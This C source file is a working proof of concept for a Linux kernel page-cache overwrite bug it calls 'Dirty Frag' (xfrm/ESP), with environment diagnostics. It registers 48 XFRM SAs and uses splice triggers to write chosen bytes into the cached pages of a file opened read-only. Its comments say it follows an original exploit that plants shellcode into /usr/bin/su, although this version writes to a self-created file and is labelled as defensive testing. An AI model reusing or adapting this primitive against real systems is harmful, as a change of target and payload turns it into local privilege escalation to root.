// Dirty Frag (CVE-2026-43284 / xfrm-ESP) full PoC + comprehensive diagnostic.
//
// Authorized defensive testing only. Targets /tmp/target.bin (created here);
// never touches system files.
//
// This version is "V4bel-faithful": it uses the exact exp.c pattern of
// registering 48 XFRM SAs and running 48 splice triggers to plant a 192-byte
// payload, but writes 'B' bytes to a self-owned file instead of writing
// shellcode to /usr/bin/su. Anything other than the original 'A' bytes in
// /tmp/target.bin's first 192 bytes proves the primitive works.
//
// Phases:
//   Phase 0 -- environment probes (kernel patch backports, conntrack, eBPF, etc.)
//   Phase 1 -- module / crypto / sandbox reachability
//   Phase 2 -- prepare /tmp/target.bin (4096 'A' bytes + fsync + prime cache)
//   Phase 3 -- run the V4bel-faithful 48-chunk exploit in a child process
//   Phase 4 -- verify and report which chunks landed
//
// Build: gcc -O0 -Wall -o /tmp/dirtyfrag_full dirtyfrag_full.c
// Run:   /tmp/dirtyfrag_full

#define _GNU_SOURCE
#include <arpa/inet.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/xfrm.h>
#include <net/if.h>
#include <netinet/in.h>
#include <poll.h>
#include <sched.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/uio.h>
#include <sys/utsname.h>
#include <sys/vfs.h>
#include <sys/wait.h>
#include <unistd.h>
#include <linux/magic.h>

#ifndef UDP_ENCAP
#define UDP_ENCAP 100
#endif
#ifndef UDP_ENCAP_ESPINUDP
#define UDP_ENCAP_ESPINUDP 2
#endif

#define PAGE        4096
#define ENC_PORT    4500
#define SEQ_VAL     200
#define REPLAY_SEQ  100
// Target path can be overridden via DIRTYFRAG_TARGET env var. Default /tmp may
// be tmpfs in some pods, where the splice path doesn't expose a page-cache
// page reference the same way disk-backed filesystems do. /var/tmp or any
// path resolved at runtime to overlayfs/ext4/xfs is preferable.
#define DEFAULT_TARGET "/tmp/target.bin"
#define PAYLOAD_LEN 192            // V4bel-faithful: 48 chunks of 4 bytes
#define PAYLOAD_BYTE 0x42          // bytes to plant; any non-0x41 indicates landing
#define SPI_BASE    0xDEADBE10u

static const char *target_path(void) {
    const char *e = getenv("DIRTYFRAG_TARGET");
    return (e && *e) ? e : DEFAULT_TARGET;
}

// ---------- helpers ----------

static const char *cat(const char *path, char *buf, size_t buflen) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        snprintf(buf, buflen, "<unreadable: %s>", strerror(errno));
        return buf;
    }
    ssize_t n = read(fd, buf, buflen - 1);
    close(fd);
    if (n < 0) { snprintf(buf, buflen, "<read err>"); return buf; }
    buf[n] = 0;
    while (n > 0 && (buf[n-1] == '\n' || buf[n-1] == ' ')) buf[--n] = 0;
    return buf;
}

static bool path_exists(const char *path) {
    struct stat st;
    return stat(path, &st) == 0;
}

static bool module_loaded(const char *name) {
    char path[256];
    snprintf(path, sizeof(path), "/sys/module/%s", name);
    if (path_exists(path)) return true;
    FILE *fp = fopen("/proc/modules", "r");
    if (!fp) return false;
    char line[512];
    size_t namelen = strlen(name);
    bool found = false;
    while (fgets(line, sizeof(line), fp)) {
        if (strncmp(line, name, namelen) == 0 && line[namelen] == ' ') {
            found = true; break;
        }
    }
    fclose(fp);
    return found;
}

static bool crypto_has(const char *name) {
    FILE *fp = fopen("/proc/crypto", "r");
    if (!fp) return false;
    char line[512];
    size_t namelen = strlen(name);
    bool found = false;
    while (fgets(line, sizeof(line), fp)) {
        if (strncmp(line, "name", 4) != 0) continue;
        char *colon = strchr(line, ':');
        if (!colon) continue;
        char *v = colon + 1;
        while (*v == ' ' || *v == '\t') v++;
        if (strncmp(v, name, namelen) == 0) {
            char c = v[namelen];
            if (c == 0 || c == '\n' || c == ' ' || c == '\t') {
                found = true; break;
            }
        }
    }
    fclose(fp);
    return found;
}

static int write_proc(const char *path, const char *buf) {
    int fd = open(path, O_WRONLY);
    if (fd < 0) return -1;
    int n = write(fd, buf, strlen(buf));
    close(fd);
    return n;
}

static void put_attr(struct nlmsghdr *nlh, int type, const void *data, size_t len) {
    struct rtattr *rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = type;
    rta->rta_len  = RTA_LENGTH(len);
    memcpy(RTA_DATA(rta), data, len);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
}

static void section(const char *title) {
    putchar('\n');
    for (int i = 0; i < 72; i++) putchar('=');
    printf("\n%s\n", title);
    for (int i = 0; i < 72; i++) putchar('=');
    putchar('\n');
}

static int count_dir_entries(const char *path) {
    DIR *d = opendir(path);
    if (!d) return -1;
    int n = 0;
    struct dirent *e;
    while ((e = readdir(d))) {
        if (strcmp(e->d_name, ".") && strcmp(e->d_name, "..")) n++;
    }
    closedir(d);
    return n;
}

// ---------- splice-page-frag plumbing detection ----------
//
// The Dirty Frag exploit's central mechanism is splice_to_socket() planting
// a page-cache page directly into skb frag[0] via MSG_SPLICE_PAGES. That
// machinery was added in kernel 6.5 (commit 2dc334f1a63a, 2023-06). Older
// kernels' splice() to a UDP socket COPIES the bytes into a normal skb
// buffer instead, which means the in-place STORE in esp_input() lands on
// kernel-private memory, not the user's page cache.
//
// Returns true if the running kernel is likely to have the splice-pages
// plumbing required to reach the bug.
static bool kernel_has_splice_pages(const char *release) {
    int major = 0, minor = 0;
    if (sscanf(release, "%d.%d", &major, &minor) != 2) return false;
    if (major > 6) return true;
    if (major == 6 && minor >= 5) return true;
    return false;  // 6.4 was the first upstream with MSG_SPLICE_PAGES,
                   // but splice_to_socket() landed cleanly in 6.5.
}

// Map a statfs f_type to a human-readable name and a "page-cache friendly"
// flag. Page-cache friendly = the FS has a real page cache that the splice
// path can pin by reference. tmpfs is anonymous-page-backed; ramfs likewise.
// overlayfs, ext4, xfs, btrfs are page-cache-backed and Dirty-Frag-relevant.
static const char *fs_name(unsigned long type, bool *page_cache_friendly) {
    *page_cache_friendly = true;
    switch (type) {
        case TMPFS_MAGIC:    *page_cache_friendly = false; return "tmpfs";
        case RAMFS_MAGIC:    *page_cache_friendly = false; return "ramfs";
        case OVERLAYFS_SUPER_MAGIC: return "overlayfs";
        case EXT4_SUPER_MAGIC:      return "ext4 (or ext2/ext3)";
        case XFS_SUPER_MAGIC:       return "xfs";
        case BTRFS_SUPER_MAGIC:     return "btrfs";
        case PROC_SUPER_MAGIC: *page_cache_friendly = false; return "proc";
        case SYSFS_MAGIC:      *page_cache_friendly = false; return "sysfs";
        default: return "unknown";
    }
}

// Detect if Cilium IPsec is plausibly active on this host. Cilium pins its
// eBPF programs and maps under /sys/fs/bpf/cilium/, and in IPsec mode also
// installs XFRM SAs/policies on the host. Both are useful signals.
static int cilium_signals(void) {
    int hits = 0;
    if (path_exists("/sys/fs/bpf/cilium")) hits++;
    if (path_exists("/sys/fs/bpf/tc/globals/cilium_ipsec_state")) hits++;
    if (path_exists("/run/cilium/cilium.pid")) hits++;
    if (path_exists("/var/run/cilium/cilium.pid")) hits++;
    DIR *d = opendir("/sys/fs/bpf");
    if (d) {
        struct dirent *e;
        while ((e = readdir(d))) {
            if (strstr(e->d_name, "cilium")) { hits++; break; }
        }
        closedir(d);
    }
    return hits;
}

// kallsyms grep — needs CAP_SYSLOG to see addresses, but symbol name visibility
// is enough for our purpose. May be filtered/empty inside the container.
static bool kallsyms_has(const char *symbol) {
    FILE *fp = fopen("/proc/kallsyms", "r");
    if (!fp) return false;
    char line[1024];
    size_t L = strlen(symbol);
    bool found = false;
    while (fgets(line, sizeof(line), fp)) {
        // Each line: "<addr> <type> <name>\n"
        char *p = strchr(line, ' ');
        if (!p) continue;
        p = strchr(p + 1, ' ');
        if (!p) continue;
        p++;
        if (strncmp(p, symbol, L) == 0) {
            char c = p[L];
            if (c == 0 || c == '\n' || c == '\t') {
                found = true; break;
            }
        }
    }
    fclose(fp);
    return found;
}

// ---------- Phase 0: backport / hook probes ----------

static void phase0_environment(void) {
    section("Phase 0 -- environment probes (backports, hooks)");

    char buf[8192];

    printf("  /proc/cmdline:\n    %s\n", cat("/proc/cmdline", buf, sizeof(buf)));
    printf("  /etc/os-release (if accessible from container):\n");
    int fd = open("/etc/os-release", O_RDONLY);
    if (fd >= 0) {
        ssize_t n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        if (n > 0) {
            buf[n] = 0;
            char *line = strtok(buf, "\n");
            while (line) {
                if (strstr(line, "NAME") || strstr(line, "VERSION") ||
                    strstr(line, "PRETTY")) {
                    printf("    %s\n", line);
                }
                line = strtok(NULL, "\n");
            }
        }
    } else {
        printf("    (cannot read: %s)\n", strerror(errno));
    }

    printf("  Live-patches loaded:\n");
    int n = count_dir_entries("/sys/kernel/livepatch");
    if (n < 0) printf("    /sys/kernel/livepatch not present (no klp module)\n");
    else if (n == 0) printf("    /sys/kernel/livepatch present, but empty (no patches active)\n");
    else            printf("    /sys/kernel/livepatch has %d patch(es) active <-- backport possible\n", n);

    printf("  conntrack / netfilter on loopback:\n");
    fd = open("/proc/net/nf_conntrack", O_RDONLY);
    if (fd < 0) {
        printf("    /proc/net/nf_conntrack not readable (%s) -- conntrack likely off or filtered\n",
               strerror(errno));
    } else {
        char tiny[256];
        ssize_t r = read(fd, tiny, sizeof(tiny) - 1);
        close(fd);
        if (r > 0) printf("    nf_conntrack readable -- conntrack IS active (clones skbs on lo)\n");
        else       printf("    nf_conntrack open OK but empty\n");
    }
    cat("/proc/sys/net/netfilter/nf_conntrack_skip_filter", buf, sizeof(buf));
    printf("    nf_conntrack_skip_filter:  %s\n", buf);

    printf("  eBPF programs pinned (/sys/fs/bpf):\n");
    n = count_dir_entries("/sys/fs/bpf");
    if (n < 0)      printf("    /sys/fs/bpf not present\n");
    else if (n == 0)printf("    /sys/fs/bpf present, empty\n");
    else            printf("    /sys/fs/bpf has %d entry/entries <-- could be intercepting socket/skb\n", n);

    printf("  /sys/kernel/security/lockdown:\n    %s\n",
           cat("/sys/kernel/security/lockdown", buf, sizeof(buf)));

    printf("  Splice-page-frag plumbing (required to plant a page cache page\n");
    printf("                             into a skb frag, the exploit primitive):\n");
    struct utsname u;
    bool version_says_yes = false;
    if (uname(&u) == 0) {
        version_says_yes = kernel_has_splice_pages(u.release);
        printf("    kernel %s heuristic:  splice_to_socket() expected: %s\n",
               u.release, version_says_yes ? "YES (>=6.5)" : "NO  (<6.5, no MSG_SPLICE_PAGES)");
    }
    bool sym_splice_to_socket = kallsyms_has("splice_to_socket");
    bool sym_iov_iter_extract_pages = kallsyms_has("iov_iter_extract_pages");
    printf("    /proc/kallsyms 'splice_to_socket':         %s\n",
           sym_splice_to_socket ? "PRESENT (overrides version heuristic)"
                                : "absent (or kallsyms hidden)");
    printf("    /proc/kallsyms 'iov_iter_extract_pages':   %s\n",
           sym_iov_iter_extract_pages ? "PRESENT" : "absent (or kallsyms hidden)");
    bool plumbing_present = sym_splice_to_socket || version_says_yes;
    if (!plumbing_present) {
        printf("    -> Kernel likely lacks the splice-pages plumbing the V4bel\n");
        printf("       exploit relies on. esp_input()'s buggy skip_cow branch is\n");
        printf("       present in source, but splice() to a UDP socket copies bytes\n");
        printf("       into a fresh skb buffer instead of planting the page cache\n");
        printf("       page. The in-place STORE hits a kernel-allocated buffer that\n");
        printf("       gets freed -- the file's page cache is untouched.\n");
        printf("    -> If kallsyms is hidden in your container, run from the host:\n");
        printf("         grep -E 'splice_to_socket|iov_iter_extract_pages' /proc/kallsyms\n");
        printf("       If those symbols ARE present, the plumbing was backported and\n");
        printf("       the exploit's failure has a different cause.\n");
    } else if (sym_splice_to_socket) {
        printf("    -> Plumbing IS present. If exploit still does not land, look\n");
        printf("       to the patch backport / hook hypotheses below.\n");
    }

    // Filesystem of the chosen target file -- tmpfs has anonymous-page-backed
    // semantics that the splice path doesn't expose to esp_input the way real
    // page-cache-backed FSes do.
    const char *path = target_path();
    char dirpath[512];
    snprintf(dirpath, sizeof(dirpath), "%s", path);
    char *slash = strrchr(dirpath, '/');
    if (slash && slash != dirpath) *slash = 0; else strcpy(dirpath, "/");
    struct statfs sf;
    printf("  Filesystem of target dir (%s):\n", dirpath);
    if (statfs(dirpath, &sf) == 0) {
        bool friendly;
        const char *name = fs_name(sf.f_type, &friendly);
        printf("    f_type 0x%lx -> %s  (page-cache friendly: %s)\n",
               (unsigned long)sf.f_type, name, friendly ? "YES" : "NO");
        if (!friendly) {
            printf("    -> %s is not a real page-cache-backed filesystem.\n", name);
            printf("       The Dirty Frag exploit needs the splice() to plant a\n");
            printf("       *page-cache page* into the skb frag. tmpfs/ramfs use\n");
            printf("       anonymous pages without the same splice exposure.\n");
            printf("       Set DIRTYFRAG_TARGET to a path on overlayfs/ext4/xfs\n");
            printf("       and rerun. Likely candidates: /var/tmp/target.bin,\n");
            printf("       $HOME/target.bin, or anywhere under /opt/.\n");
        }
    } else {
        printf("    statfs failed: %s\n", strerror(errno));
    }

    int cilium = cilium_signals();
    printf("  Cilium signals: %d\n", cilium);
    if (cilium > 0) {
        printf("    -> Cilium is plausibly running on this host.\n");
        printf("       If Cilium is in IPsec mode, esp4/esp6 are loaded for\n");
        printf("       legitimate pod-to-pod encryption -- which means the\n");
        printf("       module-presence signal is informational, not an indicator\n");
        printf("       that the platform team forgot to blacklist it. Mitigation\n");
        printf("       must come from kernel patch or seccomp/userns blocking,\n");
        printf("       not module unload.\n");
    }
}

// ---------- Phase 1: reachability ----------

static void phase1_reachability(void) {
    section("Phase 1 -- reachability");
    struct utsname u;
    if (uname(&u) == 0) printf("  Kernel: %s %s %s\n", u.sysname, u.release, u.version);
    printf("  Patch ref: mainline f4c50a4034e6 (CVE-2026-43284 fix, 2026-05-08)\n");
    printf("  Module presence on node:\n");
    printf("    esp4.ko:    %s\n", module_loaded("esp4")    ? "loaded" : "ABSENT");
    printf("    esp6.ko:    %s\n", module_loaded("esp6")    ? "loaded" : "ABSENT");
    printf("    rxrpc.ko:   %s\n", module_loaded("rxrpc")   ? "loaded" : "ABSENT");
    printf("    xfrm_user:  %s\n", module_loaded("xfrm_user") ? "loaded" : "ABSENT");
    printf("  Crypto primitives in /proc/crypto:\n");
    printf("    authencesn(hmac(sha256),cbc(aes)):  %s\n",
           crypto_has("authencesn(hmac(sha256),cbc(aes))") ? "yes" : "no");
    printf("    hmac(sha256):                       %s\n",
           crypto_has("hmac(sha256)") ? "yes" : "no");
    printf("    cbc(aes):                           %s\n",
           crypto_has("cbc(aes)") ? "yes" : "no");

    char buf[8192], seccomp[32] = "?", capeff[32] = "?";
    cat("/proc/self/status", buf, sizeof(buf));
    char *p;
    if ((p = strstr(buf, "Seccomp:"))) sscanf(p, "Seccomp: %31s", seccomp);
    if ((p = strstr(buf, "CapEff:")))  sscanf(p, "CapEff: %31s", capeff);
    printf("  Sandbox:  Seccomp=%s  CapEff=%s\n", seccomp, capeff);
    printf("            SELinux=%s\n", cat("/proc/self/attr/current", buf, sizeof(buf)));
}

// ---------- Phase 2: target file ----------

static int phase2_prepare_target(void) {
    section("Phase 2 -- prepare target file");
    unsigned char *a;
    if (posix_memalign((void **)&a, PAGE, PAGE)) { perror("memalign"); return -1; }
    memset(a, 'A', PAGE);
    int fd = open(target_path(), O_RDWR | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) { perror("open create"); free(a); return -1; }
    if (write(fd, a, PAGE) != PAGE) { perror("write"); close(fd); free(a); return -1; }
    fsync(fd);
    close(fd);
    fd = open(target_path(), O_RDONLY);
    read(fd, a, PAGE);  // prime cache
    close(fd);
    free(a);
    printf("  Wrote 'A' * %d to %s, fsynced, primed cache.\n", PAGE, target_path());
    return 0;
}

// ---------- Phase 3: V4bel-faithful exploit ----------

static int setup_userns_netns(int verbose) {
    uid_t uid = getuid();
    gid_t gid = getgid();
    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
        printf("    unshare(USER|NET): FAILED  %s\n", strerror(errno));
        return -1;
    }
    if (write_proc("/proc/self/setgroups", "deny") < 0) return -1;
    char map[64];
    snprintf(map, sizeof(map), "0 %u 1", uid);
    if (write_proc("/proc/self/uid_map", map) < 0) return -1;
    snprintf(map, sizeof(map), "0 %u 1", gid);
    if (write_proc("/proc/self/gid_map", map) < 0) return -1;
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return -1;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, "lo", IFNAMSIZ - 1);
    if (ioctl(s, SIOCGIFFLAGS, &ifr) < 0) { close(s); return -1; }
    ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
    if (ioctl(s, SIOCSIFFLAGS, &ifr) < 0) { close(s); return -1; }
    close(s);
    if (verbose) printf("    setup_userns_netns:  OK\n");
    return 0;
}

static int add_xfrm_sa(uint32_t spi, uint32_t patch_seqhi) {
    int sk = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
    if (sk < 0) return -1;
    struct sockaddr_nl nl = { .nl_family = AF_NETLINK };
    if (bind(sk, (struct sockaddr *)&nl, sizeof(nl)) < 0) { close(sk); return -1; }

    char buf[4096] = {0};
    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    nlh->nlmsg_type  = XFRM_MSG_NEWSA;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    nlh->nlmsg_pid   = getpid();
    nlh->nlmsg_seq   = 1;
    nlh->nlmsg_len   = NLMSG_LENGTH(sizeof(struct xfrm_usersa_info));

    struct xfrm_usersa_info *xs = (struct xfrm_usersa_info *)NLMSG_DATA(nlh);
    xs->id.daddr.a4   = inet_addr("127.0.0.1");
    xs->id.spi        = htonl(spi);
    xs->id.proto      = IPPROTO_ESP;
    xs->saddr.a4      = inet_addr("127.0.0.1");
    xs->family        = AF_INET;
    xs->mode          = XFRM_MODE_TRANSPORT;
    xs->replay_window = 0;
    xs->reqid         = 0x1234;
    xs->flags         = XFRM_STATE_ESN;
    xs->lft.soft_byte_limit   = (uint64_t)-1;
    xs->lft.hard_byte_limit   = (uint64_t)-1;
    xs->lft.soft_packet_limit = (uint64_t)-1;
    xs->lft.hard_packet_limit = (uint64_t)-1;
    xs->sel.family = AF_INET;
    xs->sel.prefixlen_d = 32;
    xs->sel.prefixlen_s = 32;
    xs->sel.daddr.a4 = inet_addr("127.0.0.1");
    xs->sel.saddr.a4 = inet_addr("127.0.0.1");

    {
        char ab[sizeof(struct xfrm_algo_auth) + 32] = {0};
        struct xfrm_algo_auth *aa = (struct xfrm_algo_auth *)ab;
        strncpy(aa->alg_name, "hmac(sha256)", sizeof(aa->alg_name) - 1);
        aa->alg_key_len = 32 * 8;
        aa->alg_trunc_len = 128;
        memset(aa->alg_key, 0xAA, 32);
        put_attr(nlh, XFRMA_ALG_AUTH_TRUNC, ab, sizeof(ab));
    }
    {
        char eb[sizeof(struct xfrm_algo) + 16] = {0};
        struct xfrm_algo *ea = (struct xfrm_algo *)eb;
        strncpy(ea->alg_name, "cbc(aes)", sizeof(ea->alg_name) - 1);
        ea->alg_key_len = 16 * 8;
        memset(ea->alg_key, 0xBB, 16);
        put_attr(nlh, XFRMA_ALG_CRYPT, eb, sizeof(eb));
    }
    {
        struct xfrm_encap_tmpl enc = {0};
        enc.encap_type  = UDP_ENCAP_ESPINUDP;
        enc.encap_sport = htons(ENC_PORT);
        enc.encap_dport = htons(ENC_PORT);
        put_attr(nlh, XFRMA_ENCAP, &enc, sizeof(enc));
    }
    {
        char esnb[sizeof(struct xfrm_replay_state_esn) + 4] = {0};
        struct xfrm_replay_state_esn *esn = (struct xfrm_replay_state_esn *)esnb;
        esn->bmp_len = 1;
        esn->oseq = 0;
        esn->seq = REPLAY_SEQ;
        esn->oseq_hi = 0;
        esn->seq_hi = patch_seqhi;
        esn->replay_window = 32;
        put_attr(nlh, XFRMA_REPLAY_ESN_VAL, esnb, sizeof(esnb));
    }

    if (send(sk, nlh, nlh->nlmsg_len, 0) < 0) { close(sk); return -1; }
    char rb[4096];
    int n = recv(sk, rb, sizeof(rb), 0);
    close(sk);
    if (n < 0) return -1;
    struct nlmsghdr *rh = (struct nlmsghdr *)rb;
    if (rh->nlmsg_type == NLMSG_ERROR) {
        struct nlmsgerr *e = NLMSG_DATA(rh);
        if (e->error) return -1;
    }
    return 0;
}

static int do_one_write(const char *path, off_t offset, uint32_t spi) {
    int sk_recv = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk_recv < 0) return -1;
    int one = 1;
    setsockopt(sk_recv, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    struct sockaddr_in sa = {
        .sin_family = AF_INET,
        .sin_port   = htons(ENC_PORT),
        .sin_addr   = { inet_addr("127.0.0.1") },
    };
    if (bind(sk_recv, (struct sockaddr *)&sa, sizeof(sa)) < 0) { close(sk_recv); return -1; }
    int encap = UDP_ENCAP_ESPINUDP;
    if (setsockopt(sk_recv, IPPROTO_UDP, UDP_ENCAP, &encap, sizeof(encap)) < 0) {
        close(sk_recv); return -1;
    }
    int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk_send < 0) { close(sk_recv); return -1; }
    if (connect(sk_send, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        close(sk_send); close(sk_recv); return -1;
    }
    int file_fd = open(path, O_RDONLY);
    if (file_fd < 0) { close(sk_send); close(sk_recv); return -1; }
    int pfd[2];
    if (pipe(pfd) < 0) { close(file_fd); close(sk_send); close(sk_recv); return -1; }

    uint8_t hdr[24];
    *(uint32_t *)(hdr + 0) = htonl(spi);
    *(uint32_t *)(hdr + 4) = htonl(SEQ_VAL);
    memset(hdr + 8, 0xCC, 16);

    struct iovec iov = { .iov_base = hdr, .iov_len = sizeof(hdr) };
    if (vmsplice(pfd[1], &iov, 1, 0) != (ssize_t)sizeof(hdr)) goto fail;
    off_t off = offset;
    if (splice(file_fd, &off, pfd[1], NULL, 16, SPLICE_F_MOVE) != 16) goto fail;
    splice(pfd[0], NULL, sk_send, NULL, 24 + 16, SPLICE_F_MOVE);
    usleep(150 * 1000);
    close(file_fd); close(pfd[0]); close(pfd[1]); close(sk_send); close(sk_recv);
    return 0;
fail:
    close(file_fd); close(pfd[0]); close(pfd[1]); close(sk_send); close(sk_recv);
    return -1;
}

static int phase3_exploit(void) {
    section("Phase 3 -- V4bel-faithful exploit (48 chunks)");
    pid_t pid = fork();
    if (pid < 0) { perror("fork"); return -1; }
    if (pid == 0) {
        if (setup_userns_netns(1) < 0) _exit(2);

        // Plant 'B' bytes via 48 chunks; each chunk's seq_hi = 0x42424242
        uint32_t plant = 0;
        memset(&plant, PAYLOAD_BYTE, 4);   // 0x42424242

        int sa_fail = 0, trig_fail = 0;
        for (int i = 0; i < PAYLOAD_LEN / 4; i++) {
            uint32_t spi = SPI_BASE + i;
            if (add_xfrm_sa(spi, plant) < 0) sa_fail++;
        }
        printf("    SAs registered:  %d / %d\n",
               (PAYLOAD_LEN / 4) - sa_fail, PAYLOAD_LEN / 4);
        if (sa_fail == PAYLOAD_LEN / 4) _exit(3);

        for (int i = 0; i < PAYLOAD_LEN / 4; i++) {
            uint32_t spi = SPI_BASE + i;
            off_t off = i * 4;
            if (do_one_write(target_path(), off, spi) < 0) trig_fail++;
        }
        printf("    Splice triggers: %d / %d sent\n",
               (PAYLOAD_LEN / 4) - trig_fail, PAYLOAD_LEN / 4);
        _exit(0);
    }
    int st;
    waitpid(pid, &st, 0);
    return WIFEXITED(st) ? WEXITSTATUS(st) : -1;
}

// ---------- Phase 4: verify ----------

static void phase4_verify(int child_rc) {
    section("Phase 4 -- verify target file");
    unsigned char buf[PAYLOAD_LEN];
    int fd = open(target_path(), O_RDONLY);
    if (fd < 0) { perror("verify open"); return; }
    int n = read(fd, buf, sizeof(buf));
    close(fd);
    if (n != (int)sizeof(buf)) { perror("verify read"); return; }

    int landed_chunks = 0, total_b_bytes = 0;
    for (int i = 0; i < PAYLOAD_LEN / 4; i++) {
        bool chunk_landed = (buf[i*4] == PAYLOAD_BYTE && buf[i*4+1] == PAYLOAD_BYTE &&
                             buf[i*4+2] == PAYLOAD_BYTE && buf[i*4+3] == PAYLOAD_BYTE);
        if (chunk_landed) landed_chunks++;
        for (int j = 0; j < 4; j++) if (buf[i*4 + j] == PAYLOAD_BYTE) total_b_bytes++;
    }

    printf("  First 32 bytes (cached read): ");
    for (int i = 0; i < 32; i++) printf("%02x ", buf[i]);
    putchar('\n');
    printf("  Chunks landed (4 'B' in a row): %d / %d\n",
           landed_chunks, PAYLOAD_LEN / 4);
    printf("  Total 'B' (0x42) bytes: %d / %d\n", total_b_bytes, PAYLOAD_LEN);

    if (landed_chunks > 0) {
        printf("\n  RESULT: LANDED -- Dirty Frag primitive succeeded on this kernel.\n");
        printf("    Multi-method reader on %s should now report DIFFER\n", target_path());
        printf("    (cached shows 0x42 at landed offsets; O_DIRECT shows 0x41 throughout).\n");
        return;
    }
    printf("\n  RESULT: NOT LANDED -- no chunks landed (all bytes still 0x41).\n");
    printf("\n  Diagnostic interpretation:\n");
    if (child_rc != 0) {
        printf("    * Child exited %d -- some setup step failed in Phase 3.\n", child_rc);
        return;
    }
    printf("    * Phase 3 reported all 48 SAs registered and all 48 triggers sent.\n");
    printf("    * Yet zero bytes changed in the page cache.\n");
    printf("\n  This pattern means the in-place STORE did not hit the page cache.\n");
    printf("  Most likely causes (ordered by likelihood for kernels < 6.5):\n");
    printf("    1. KERNEL TOO OLD FOR THE EXPLOIT VEHICLE. The V4bel exploit relies\n");
    printf("       on splice_to_socket() automatically setting MSG_SPLICE_PAGES so\n");
    printf("       that splice() plants a page-cache page directly into skb frag[0].\n");
    printf("       That machinery was added in kernel 6.5. On 6.1 LTS and earlier,\n");
    printf("       splice() copies bytes into a fresh skb buffer instead -- the bug\n");
    printf("       fires but writes to kernel-private memory, not the page cache.\n");
    printf("       See Phase 0 'splice-page-frag plumbing' line.\n");
    printf("    2. Kernel has the f4c50a4034e6 patch backported (vendor or kpatch).\n");
    printf("       See Phase 0 livepatch line.\n");
    printf("    3. A pre-xfrm kernel hook (conntrack on lo, eBPF on socket/skb)\n");
    printf("       is cloning the skb before esp_input() examines skb_cloned().\n");
    printf("       See Phase 0 conntrack and /sys/fs/bpf lines.\n");
    printf("    4. The bug is gated on per-distro patch sets that aren't reflected\n");
    printf("       in mainline. Check /etc/os-release vendor's CVE tracker.\n");
}

// ---------- main ----------

int main(void) {
    printf("Dirty Frag (CVE-2026-43284) full PoC + diagnostic against %s\n", target_path());
    printf("Authorized defensive testing only -- targets a self-owned file.\n");

    phase0_environment();
    phase1_reachability();
    if (phase2_prepare_target() < 0) return 1;
    int rc = phase3_exploit();
    phase4_verify(rc);
    return 0;
}
